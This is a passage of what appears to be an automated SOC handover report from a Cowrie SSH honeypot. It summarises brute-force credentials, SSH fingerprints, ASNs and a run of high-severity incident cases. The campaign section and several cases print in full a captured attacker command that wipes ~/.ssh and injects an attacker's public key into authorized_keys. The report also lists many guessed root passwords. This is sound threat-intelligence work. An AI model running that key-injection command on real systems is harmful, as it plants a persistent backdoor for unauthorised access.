# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-21 |
| **Generated At** | 2026-04-21T06:06:02Z |
| **Shift Time** | 06:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **245** |
| Confirmed Threats | **243** |
| False Positives Filtered | **2** (0.8%) |
| Unique Attacker IPs | **17** |
| Countries of Origin | **11** |
| High Severity Cases | **102** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **143** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **203** |
| Unique Credential Pairs | **52** |
| Unique Usernames | **24** |
| Unique Passwords | **52** |
| Successful Auth Pairs | **56** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 102 |
| `345gs5662d34` | 51 |
| `ubuntu` | 7 |
| `claude` | 6 |
| `ali` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 51 |
| `3245gs5662d34` | 51 |
| `ali2` | 3 |
| `123456` | 3 |
| `Oracle29!` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 51 |
| `root` | `3245gs5662d34` | 51 |
| `ali` | `ali2` | 3 |
| `userftp` | `123456` | 3 |
| `oracle` | `Oracle29!` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qwert123!` | `103.82.92.255` | 2026-04-21T04:52:18 |
| `root` | `Test2026!` | `182.229.12.64` | 2026-04-21T04:54:02 |
| `root` | `3245gs5662d34` | `182.229.12.64` | 2026-04-21T04:54:06 |
| `root` | `3245gs5662d34` | `103.82.92.255` | 2026-04-21T04:54:09 |
| `root` | `root01!!` | `37.143.61.132` | 2026-04-21T04:55:22 |
| `root` | `A1234566` | `103.200.25.79` | 2026-04-21T04:55:24 |
| `root` | `3245gs5662d34` | `37.143.61.132` | 2026-04-21T04:55:27 |
| `root` | `3245gs5662d34` | `103.200.25.79` | 2026-04-21T04:55:27 |
| `root` | `Test2026!` | `103.194.239.180` | 2026-04-21T04:55:36 |
| `root` | `3245gs5662d34` | `103.194.239.180` | 2026-04-21T04:55:40 |
| `root` | `qazwsx001@#` | `182.229.12.64` | 2026-04-21T04:55:53 |
| `root` | `Test2026!` | `103.200.25.79` | 2026-04-21T04:57:25 |
| `root` | `09N1RCa1Hs31` | `103.194.239.180` | 2026-04-21T04:58:59 |
| `root` | `A123456..` | `182.229.12.64` | 2026-04-21T05:01:03 |
| `root` | `root111111.` | `103.200.25.79` | 2026-04-21T05:01:04 |
| `root` | `qwerty1234!` | `37.143.61.132` | 2026-04-21T05:02:04 |
| `root` | `Amir@123` | `103.194.239.180` | 2026-04-21T05:02:17 |
| `root` | `A123456..` | `103.194.239.180` | 2026-04-21T05:03:59 |
| `root` | `Amir@123` | `182.229.12.64` | 2026-04-21T05:04:30 |
| `root` | `root111111.` | `103.194.239.180` | 2026-04-21T05:05:42 |
| `root` | `123456.Aa` | `37.143.61.132` | 2026-04-21T05:06:17 |
| `root` | `nigga` | `37.143.61.132` | 2026-04-21T05:07:39 |
| `root` | `Qazwsx11111111@123` | `182.229.12.64` | 2026-04-21T05:07:54 |
| `root` | `qazwsx999@@` | `37.143.61.132` | 2026-04-21T05:09:06 |
| `root` | `P@ssw0rd777` | `103.200.25.79` | 2026-04-21T05:10:25 |
| `root` | `qazwsx001@#` | `103.194.239.180` | 2026-04-21T05:10:58 |
| `root` | `Qwert123!` | `37.143.61.132` | 2026-04-21T05:11:50 |
| `root` | `ddBB000` | `103.200.25.79` | 2026-04-21T05:12:18 |
| `root` | `A1234566` | `103.194.239.180` | 2026-04-21T05:12:37 |
| `root` | `A1234566` | `182.229.12.64` | 2026-04-21T05:13:09 |
| `root` | `Qazwsx2022#$` | `37.143.61.132` | 2026-04-21T05:13:10 |
| `root` | `09N1RCa1Hs31` | `103.200.25.79` | 2026-04-21T05:14:12 |
| `root` | `ZAQ!2wsx2019$` | `103.194.239.180` | 2026-04-21T05:15:59 |
| `root` | `root111111.` | `182.229.12.64` | 2026-04-21T05:16:34 |
| `root` | `Oracle12` | `37.143.61.132` | 2026-04-21T05:17:09 |
| `root` | `qazwsx001@#` | `103.200.25.79` | 2026-04-21T05:18:01 |
| `root` | `ZAQ!2wsx2019$` | `182.229.12.64` | 2026-04-21T05:18:15 |
| `root` | `P@ssw0rd777` | `103.194.239.180` | 2026-04-21T05:19:22 |
| `root` | `Qwert!` | `37.143.61.132` | 2026-04-21T05:19:49 |
| `root` | `P@ssw0rd777` | `182.229.12.64` | 2026-04-21T05:19:55 |
| `root` | `qwer1234!@#` | `103.194.239.180` | 2026-04-21T05:21:09 |
| `root` | `key` | `37.143.61.132` | 2026-04-21T05:21:15 |
| `root` | `qwer1234!@#` | `182.229.12.64` | 2026-04-21T05:21:43 |
| `root` | `Apple@123` | `103.194.239.180` | 2026-04-21T05:22:58 |
| `root` | `Apple@123` | `182.229.12.64` | 2026-04-21T05:23:31 |
| `root` | `Qazwsx11111111@123` | `103.200.25.79` | 2026-04-21T05:23:47 |
| `root` | `Admin1234567@` | `37.143.61.132` | 2026-04-21T05:24:13 |
| `root` | `Apple@123` | `103.200.25.79` | 2026-04-21T05:25:38 |
| `root` | `ZAQ!2wsx2019$` | `103.200.25.79` | 2026-04-21T05:27:34 |
| `root` | `Qazwsx11111111@123` | `103.194.239.180` | 2026-04-21T05:28:05 |
| `root` | `ddBB000` | `182.229.12.64` | 2026-04-21T05:28:44 |
| `root` | `A123456..` | `103.200.25.79` | 2026-04-21T05:29:30 |
| `root` | `ddBB000` | `103.194.239.180` | 2026-04-21T05:29:48 |
| `root` | `Amir@123` | `103.200.25.79` | 2026-04-21T05:31:19 |
| `root` | `09N1RCa1Hs31` | `182.229.12.64` | 2026-04-21T05:33:52 |
| `root` | `qwer1234!@#` | `103.200.25.79` | 2026-04-21T05:36:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **245** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 205 |
| Unknown | 3 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 205 | 7 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `0a07365cc01f...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 205 | 7 | Modern SSH client |
| `95420f9d932d...` | Unknown | 3 | 1 | — |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 51 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `37.143.61.132`, `103.82.92.255`, `103.194.239.180`, `103.200.25.79`, `182.229.12.64`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **17** |
| Unique ASNs | **15** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS17858` | LG POWERCOMM | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS134518` | RETN (Hong Kong) Limited | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS3132` | Red Cientifica Peruana | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (102)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4077ef21fc9b

| Field | Detail |
|---|---|
| **Source IP** | `103.82.92[.]255` |
| **First Seen** | 2026-04-21 04:52 |
| **Last Seen** | 2026-04-21 04:54 |
| **Session Duration** | 112s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:52:16` | `cowrie.session.connect` |
| `2026-04-21 04:52:16` | `cowrie.client.version` |
| `2026-04-21 04:52:17` | `cowrie.client.kex` |
| `2026-04-21 04:52:18` | `cowrie.login.success` |
| `2026-04-21 04:52:19` | `cowrie.session.params` |
| `2026-04-21 04:52:19` | `cowrie.command.input` |
| `2026-04-21 04:52:19` | `cowrie.command.failed` |
| `2026-04-21 04:52:20` | `cowrie.log.closed` |
| `2026-04-21 04:52:24` | `cowrie.session.params` |
| `2026-04-21 04:52:24` | `cowrie.command.input` |
| `2026-04-21 04:54:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.92[.]255` to AbuseIPDB if not already reported
- [ ] Block `103.82.92[.]255` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6d7e0c19c1a

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 04:54 |
| **Last Seen** | 2026-04-21 04:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:54:01` | `cowrie.session.connect` |
| `2026-04-21 04:54:01` | `cowrie.client.version` |
| `2026-04-21 04:54:01` | `cowrie.client.kex` |
| `2026-04-21 04:54:02` | `cowrie.login.success` |
| `2026-04-21 04:54:02` | `cowrie.session.params` |
| `2026-04-21 04:54:02` | `cowrie.command.input` |
| `2026-04-21 04:54:02` | `cowrie.command.failed` |
| `2026-04-21 04:54:02` | `cowrie.log.closed` |
| `2026-04-21 04:54:03` | `cowrie.session.params` |
| `2026-04-21 04:54:03` | `cowrie.command.input` |
| `2026-04-21 04:54:03` | `cowrie.session.file_download` |
| `2026-04-21 04:54:03` | `cowrie.log.closed` |
| `2026-04-21 04:54:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d96e324a2e7

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 04:54 |
| **Last Seen** | 2026-04-21 04:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:54:05` | `cowrie.session.connect` |
| `2026-04-21 04:54:05` | `cowrie.client.version` |
| `2026-04-21 04:54:05` | `cowrie.client.kex` |
| `2026-04-21 04:54:06` | `cowrie.login.success` |
| `2026-04-21 04:54:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5d76ad76316

| Field | Detail |
|---|---|
| **Source IP** | `103.82.92[.]255` |
| **First Seen** | 2026-04-21 04:54 |
| **Last Seen** | 2026-04-21 04:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:54:08` | `cowrie.session.connect` |
| `2026-04-21 04:54:08` | `cowrie.client.version` |
| `2026-04-21 04:54:08` | `cowrie.client.kex` |
| `2026-04-21 04:54:09` | `cowrie.login.success` |
| `2026-04-21 04:54:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.92[.]255` to AbuseIPDB if not already reported
- [ ] Block `103.82.92[.]255` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81fde9a8cc48

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 04:55 |
| **Last Seen** | 2026-04-21 04:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:55:21` | `cowrie.session.connect` |
| `2026-04-21 04:55:21` | `cowrie.client.version` |
| `2026-04-21 04:55:21` | `cowrie.client.kex` |
| `2026-04-21 04:55:22` | `cowrie.login.success` |
| `2026-04-21 04:55:22` | `cowrie.session.params` |
| `2026-04-21 04:55:22` | `cowrie.command.input` |
| `2026-04-21 04:55:22` | `cowrie.command.failed` |
| `2026-04-21 04:55:23` | `cowrie.log.closed` |
| `2026-04-21 04:55:23` | `cowrie.session.params` |
| `2026-04-21 04:55:23` | `cowrie.command.input` |
| `2026-04-21 04:55:23` | `cowrie.session.file_download` |
| `2026-04-21 04:55:23` | `cowrie.log.closed` |
| `2026-04-21 04:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13728cc914e4

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 04:55 |
| **Last Seen** | 2026-04-21 04:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:55:23` | `cowrie.session.connect` |
| `2026-04-21 04:55:23` | `cowrie.client.version` |
| `2026-04-21 04:55:24` | `cowrie.client.kex` |
| `2026-04-21 04:55:24` | `cowrie.login.success` |
| `2026-04-21 04:55:24` | `cowrie.session.params` |
| `2026-04-21 04:55:24` | `cowrie.command.input` |
| `2026-04-21 04:55:24` | `cowrie.command.failed` |
| `2026-04-21 04:55:24` | `cowrie.log.closed` |
| `2026-04-21 04:55:25` | `cowrie.session.params` |
| `2026-04-21 04:55:25` | `cowrie.command.input` |
| `2026-04-21 04:55:25` | `cowrie.session.file_download` |
| `2026-04-21 04:55:25` | `cowrie.log.closed` |
| `2026-04-21 04:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8a909efae1f

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 04:55 |
| **Last Seen** | 2026-04-21 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:55:26` | `cowrie.session.connect` |
| `2026-04-21 04:55:26` | `cowrie.client.version` |
| `2026-04-21 04:55:26` | `cowrie.client.kex` |
| `2026-04-21 04:55:27` | `cowrie.login.success` |
| `2026-04-21 04:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efe668fdd9cc

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 04:55 |
| **Last Seen** | 2026-04-21 04:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:55:27` | `cowrie.session.connect` |
| `2026-04-21 04:55:27` | `cowrie.client.version` |
| `2026-04-21 04:55:27` | `cowrie.client.kex` |
| `2026-04-21 04:55:27` | `cowrie.login.success` |
| `2026-04-21 04:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d715806412e7

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 04:55 |
| **Last Seen** | 2026-04-21 04:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:55:35` | `cowrie.session.connect` |
| `2026-04-21 04:55:35` | `cowrie.client.version` |
| `2026-04-21 04:55:35` | `cowrie.client.kex` |
| `2026-04-21 04:55:36` | `cowrie.login.success` |
| `2026-04-21 04:55:36` | `cowrie.session.params` |
| `2026-04-21 04:55:36` | `cowrie.command.input` |
| `2026-04-21 04:55:36` | `cowrie.command.failed` |
| `2026-04-21 04:55:36` | `cowrie.log.closed` |
| `2026-04-21 04:55:37` | `cowrie.session.params` |
| `2026-04-21 04:55:37` | `cowrie.command.input` |
| `2026-04-21 04:55:37` | `cowrie.session.file_download` |
| `2026-04-21 04:55:37` | `cowrie.log.closed` |
| `2026-04-21 04:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dfb2923a8d3

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 04:55 |
| **Last Seen** | 2026-04-21 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:55:39` | `cowrie.session.connect` |
| `2026-04-21 04:55:39` | `cowrie.client.version` |
| `2026-04-21 04:55:39` | `cowrie.client.kex` |
| `2026-04-21 04:55:40` | `cowrie.login.success` |
| `2026-04-21 04:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52ac8b15b57b

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 04:55 |
| **Last Seen** | 2026-04-21 04:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 04:55:52` | `cowrie.session.connect` |
| `2026-04-21 04:55:52` | `cowrie.client.version` |
| `2026-04-21 04:55:53` | `cowrie.client.kex` |
| `2026-04-21 04:55:53` | `cowrie.login.success` |
| `2026-04-21 04:55:53` | `cowrie.session.params` |
| `2026-04-21 04:55:53` | `cowrie.command.input` |
| `2026-04-21 04:55:53` | `cowrie.command.failed` |
| `2026-04-21 04:55:54` | `cowrie.log.closed` |
| `2026-04-21 04:55:54` | `cowrie.session.params` |
| `2026-04-21 04:55:54` | `cowrie.command.input` |
| `2026-04-21 04:55:54` | `cowrie.session.file_download` |
| `2026-04-21 04:55:54` | `cowrie.log.closed` |
| `2026-04-21 04:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17b54d879855

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 04:55 |
| **Last Seen** | 2026-04-21 04:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
